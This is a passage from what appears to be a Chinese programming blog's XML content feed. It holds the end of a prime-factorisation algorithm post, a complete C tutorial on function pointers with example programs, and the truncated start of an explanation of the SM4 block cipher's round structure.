class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>;否则X不变.</p><p>之所以只乘<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的一次幂,而不是更高次,是因为要求X的<strong>最小值</strong></p><p>分析到此结束,代码就是套用标准的<code>质因数分解</code>外加一些判断.</p><h1 id="代码">代码</h1><p>使用C语言编写.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">primeFactorization</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = <span class="number">2</span>; i * i &lt;= n; ++i) &#123;</span><br><span class="line">        cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">            n /= i;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cnt &amp; <span class="number">1</span>) &#123; <span class="comment">// 如果幂为奇数</span></span><br><span class="line">            x *= i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n != <span class="number">1</span>) &#123;</span><br><span class="line">        x *= n; <span class="comment">// 被这个卡了半天,仍有剩余说明当前n自身为素数(不一定是原始的n(?)),需要将</span></span><br><span class="line">        <span class="comment">// 它乘上</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> n; <span class="comment">// 注意数据范围</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;n);</span><br><span class="line">    primeFactorization(n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240116114353514.png" alt="image-20240116114353514" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-13_4-函数指针</title>
      <link href="/2024a81853a8d10a/"/>
      <url>/2024a81853a8d10a/</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><ol><li>函数</li><li>指针</li></ol><p>事先声明:</p><p>本章中出现的各种程序的编译以及反汇编操作全部使用MinGW-w64工具链的gcc12以及IDA7.5,展示结果仅供参考.</p><h1 id="函数指针">函数指针</h1><p>C语言中,函数也是一个可寻址对象,我们也可以获取其地址——换句话说,函数代码被存储于内存中的某一个地方,并且可以根据其指针来访问.</p><p>调用该函数时,程序就会跳转到该函数的地址,运行此处的代码,也即调用了该函数.</p><p>显然,我们可以使用一种特殊的指针来存储一个函数的地址(指针),并且完全可以使用该指针来进行访问.</p><p>这就是<code>函数指针</code>,或者说&quot;指向函数的指针&quot;.</p><h2 id="声明一个函数指针">声明一个函数指针</h2><p>我们可以如此声明一个函数指针:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/* func函数用于返回int参数2倍 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i*<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> (*p)(<span class="type">int</span>) = func; <span class="comment">// p是一个函数指针,初始化为指向func函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p: 0x%p\n&quot;</span>, p); <span class="comment">// 输出p的值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;func: 0x%p\n&quot;</span>, &amp;func); <span class="comment">// 输出func函数的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(*p)(3): %d\n&quot;</span>,(*p)(<span class="number">3</span>)); <span class="comment">// 使用p指针调用func函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func(4): %d\n&quot;</span>,func(<span class="number">4</span>)); <span class="comment">// 调用func函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考虑声明<code> int (*p)(int)</code>:</p><p>首先从标识符<code>p</code>开始,有一对()约束<code>*p</code>,指出p是一个指针;</p><p>然后在<code>(*p)</code>外的<code>int (int)</code>代表一个函数类型,此函数接受一个int参数,并返回一个int值;</p><p>因此推导出,<code>p</code>是一个指针,可以指向<code>int (int)</code>类型的函数,亦即p是一个函数指针.</p><p>上面代码的运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240123145057712.png" alt="image-20240123145057712" style="zoom:50%;" /><p>可以看出,指针p的值(p指向的内存)就是func的地址.</p><h2 id="函数指针的类型">函数指针的类型</h2><p>前一个例子中,函数指针p指向的函数的类型是<code>int (int)</code>,它代表了&quot;一类&quot;函数,而不是具体的一个函数,考虑下面代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/* func1函数用于返回int参数2倍 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> i * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* func2函数用于返回int参数3倍 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> i * <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> (*p)(<span class="type">int</span>) = <span class="literal">NULL</span>; <span class="comment">// p是一个函数指针,初始化为NULL</span></span><br><span class="line">    p = func1; <span class="comment">// p指向func1函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/*当前p指向func1函数*/\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p: %p\n&quot;</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;func1: %p\n&quot;</span>, &amp;func1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(*p)(2): %d\n&quot;</span>, (*p)(<span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func1(3): %d\n&quot;</span>, func1(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    p=func2; <span class="comment">// p指向func2函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n/*当前p指向func2函数*/\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p: %p\n&quot;</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;func2: %p\n&quot;</span>, &amp;func2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(*p)(2): %d\n&quot;</span>, (*p)(<span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func2(3): %d\n&quot;</span>, func2(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240123145635901.png" alt="image-20240123145635901" style="zoom:50%;" /><p>显然,<code>func1</code>和<code>func2</code>的类型完全相同,均为<code>int (int)</code>,但是他们却是完全不同的2个函数,<code>p</code>指针可以分别指向他们,并进行调用.</p><br><p>另一方面,复习指针的内容:指针变量只能被赋值(指向)为指针变量所能指向的类型的地址,或者是能够被隐式转换为这种类型的地址.</p><p>和其他所有指针一样,函数指针只能指向自身指向的类型(即特定的一种函数类型)的地址.</p><p>但是需要注意,不同类型的函数指针是不能够互相转换的,也就是说,<code>int (*p)(int)</code>只能指向<code>int (int)</code>类型的函数,而不能指向例如<code>int (double)</code>类型的函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 2个不同类型的函数 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> i * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">(<span class="type">double</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> (*p)(<span class="type">int</span>) = func1;</span><br><span class="line">    <span class="comment">// 下面这行代码会报错: </span></span><br><span class="line">    <span class="comment">// invalid conversion from &#x27;int (*)(double)&#x27; to &#x27;int (*)(int)&#x27;</span></span><br><span class="line">    <span class="comment">// p = func2;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p: %p\n&quot;</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C语言中,不仅仅是参数类型,包括返回值类型,参数个数不同,都意味着他们不是相同类型的函数!</p><p>注: C语言没有函数重载,而且即使是C++的函数重载也不允许有这种指针类型转换</p><h1 id="函数名的本质">函数名的本质</h1><p>C语言在处理函数指针和函数调用这方面有一些很有意思的特性,先看下面的代码,有可能让你懵逼:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i*<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> (*p)(<span class="type">int</span>) = func;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    p: %p\n&quot;</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   *p: %p\n&quot;</span>, *p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; func: %p\n&quot;</span>, func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*func: %p\n&quot;</span>, *func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;func: %p\n&quot;</span>, &amp;func);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>令人迷惑的是,每一行的输出值都是一样的:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240123153519714.png" alt="image-20240123153519714" style="zoom:50%;" /><p>我们可以将其反汇编查看汇编代码,结果发现每一步的参数都是完全一样的:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240123154307027.png" alt="image-20240123154307027" style="zoom: 33%;" /><p>也就是说,无论是对func做<code>*</code>运算,还是<code>&amp;</code>运算,还是直接对函数名func求值,得到的结果甚至汇编代码都是完全一致的,函数指针p也是如此.</p><p>事实上,函数名被使用时总是被编译器转换为<code>函数指针</code>,因此,诸如<code>&amp;func</code>这样手动加上<code>&amp;运算符</code>只不过是显式地说明了编译器本将隐式执行的任务.</p><p>因此,我们通常会这样简化对函数指针的赋值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> i * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> (*p)(<span class="type">int</span>) = func; <span class="comment">// 直接把函数名赋值给指针,由编译器自动转换</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p: %p\n&quot;</span>, p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而同时,使用函数指针进行函数调用的代码也可以如此简化:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 简化使用指针进行函数调用</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> i * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> (*p)(<span class="type">int</span>) = func; <span class="comment">// 直接把函数名赋值给指针,由编译器自动转换</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p(2): %d\n&quot;</span>, p(<span class="number">2</span>)); <span class="comment">// 不需要(*p)(2),因为*p是函数,编译器仍然会将其重新转换为函数指针</span></span><br><span class="line">    <span class="comment">// 下面的代码没有问题,但是一步解引用看起来多此一举</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(*p)(2): %d\n&quot;</span>, (*p)(<span class="number">2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外,尽管从上面的角度分析来看,这种编译器负责的&quot;转换&quot;是必然发生的,但是事实并非如此:</p><p>就拿上面这段代码(“简化使用指针进行函数调用”)来看,编译器甚至可能直接把这个指针变量p优化掉:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240123155637813.png" alt="image-20240123155637813" style="zoom:50%;" /><p>指针变量p呢?我不知道……你知道吗(手动滑稽)</p><p>所以从实际优化的角度来看,简单的函数指针使用甚至会直接被优化掉,更别提什么&quot;函数名的转换&quot;了,统统直接用<code>lea func</code>指令获取地址就完事了……</p><p>总结:实际使用过程中一旦用一个函数指针p来指向某个函数f,那么干脆直接把p当成函数f的一个<code>别名</code>也无伤大雅.唯一的区别是,p是一个指针,可以改变它的指向.</p><h1 id="函数指针数组">函数指针数组</h1><p>这个很简单,前面讲过指针数组,函数指针数组就是一种指针数组,只不过这个数组中的每个元素都是一个函数指针而已.</p><p>简单举个例子,注意声明的写法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;add: %d + %d&quot;</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sub: %d - %d&quot;</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mul: %d * %d&quot;</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;div: %d / %d&quot;</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> a / b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/* p是一个数组,每个元素是一个指针,指针指向的类型是int (int,int)函数 */</span></span><br><span class="line">    <span class="type">int</span> (*p[<span class="number">4</span>])(<span class="type">int</span>, <span class="type">int</span>) = &#123; add, sub, mul, div &#125;; <span class="comment">// 使用4个函数指针来初始化数组</span></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; = %d\n&quot;</span>, p[i](x, y));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以<code>8 2</code>作为x,y的值运行,结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240123160756038.png" alt="image-20240123160756038" style="zoom:50%;" /><p>函数指针数组可以存储一系列类似功能(接口)的函数的指针,适当地使用可以大大简化程序,例如实现一个功能菜单的选择.</p><br><p align=right>——WAHAHA 2024.1.23</p><br><br><p>上一篇:<a href="../20237cb717142d36">C语言教程-13_3-初探指针和数组的关系</a></p><p>下一篇:<a href="../20247276fcdb268f">C语言教程-14_1-初识结构体</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SM4</title>
      <link href="/2024801cc1c29213/"/>
      <url>/2024801cc1c29213/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>SM4是一种分组密码，由我国国家密码管理局在2012年发布，常用于无线互联网加密等领域.</p><p>SM4是分组密码,分组长度为128bit(即16byte,4word),密钥长度也为128bit(即16byte,4word).</p><p>加解密过程经过32轮迭代(类似DES,AES),每一轮也都需要一个轮密钥.</p><h1 id="加密过程">加密过程</h1><p>加密过程由32轮迭代和1次反序变换组成.</p><h2 id="32轮迭代">32轮迭代</h2><p>解释:</p><ol><li><p>对4字(16byte)明文进行32轮迭代,每轮迭代都需要一个字(4byte)的轮密钥,即共需要32个轮密钥,记为(rk0,rk1,rk2,……,rk31),因此需要进行<code>密钥扩展</code>.</p></li><li><p>迭代即使用<code>轮函数F</code>不断向后计算下一个字.SM4的轮函数F接受4个1字数据和一个1字轮密钥,最终生成一个字的结果.</p></li></ol><p>第一轮迭代即使用前4字(X0-X3)计算第5个字X4;第二轮迭代即使用(X1-X4)计算第6个字X5;以此类推,最终生成36个字的结果,完成第一步,过程如下:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mn>4</mn><mo>+</mo><mi>i</mi></mrow></msub><mo>=</mo><mi>F</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>X</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>X</mi><mrow><mi>i</mi><mo>+</mo><mn>2</mn></mrow></msub><mo separator="true">,</mo><msub><mi>X</mi><mrow><mi>i</mi><mo>+</mo><mn>3</mn></mrow></msub><mo separator="true">,</mo><mi>r</mi><msub><mi>k</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mtext> </mtext><mo stretchy="false">(</mo><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>31</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X_{4+i}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i)\ (i\in[0,31])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" 